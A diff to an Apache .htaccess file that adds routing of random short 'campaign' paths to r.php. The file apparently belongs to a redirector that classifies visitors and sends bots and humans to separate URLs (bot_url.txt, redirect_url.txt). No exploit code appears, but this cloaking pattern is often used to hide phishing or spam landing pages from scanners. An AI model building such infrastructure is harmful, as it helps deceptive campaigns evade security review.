@@ -161,11 +161,16 @@ ErrorDocument 404 /index.html
     RewriteCond %{HTTP_REFERER} !^https?://(www\.)?%{HTTP_HOST} [NC]
     RewriteRule \.(gif|jpg|jpeg|png|js|css)$ - [F,L]
     
+    # RANDOM URL ROUTING - Handle clean campaign URLs (5-12 alphanumeric chars)
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^([A-Za-z0-9]{5,12})/?$ r.php [QSA,L]
+    
     # VISITOR ROUTING - Direct redirect with background behavioral analysis
     # Allow direct access to admin and system files
     RewriteCond %{REQUEST_FILENAME} !-f
     RewriteCond %{REQUEST_FILENAME} !-d
-    RewriteCond %{REQUEST_URI} !^/(index\.html|redirect\.php|bot-detector\.js|get_visitors\.php|check_auth\.php|admin_login\.php|admin_action\.php|get_config\.php|update_config\.php|test_api\.php|visitors\.json|redirect_url\.txt|bot_url\.txt|api_key\.txt)$
+    RewriteCond %{REQUEST_URI} !^/(index\.html|redirect\.php|r\.php|bot-detector\.js|get_visitors\.php|check_auth\.php|admin_login\.php|admin_action\.php|get_config\.php|update_config\.php|test_api\.php|visitors\.json|redirect_url\.txt|bot_url\.txt|api_key\.txt)$
     
     # Route all traffic directly to redirect.php for instant classification
     RewriteRule ^(.*)$ redirect.php [QSA,L]
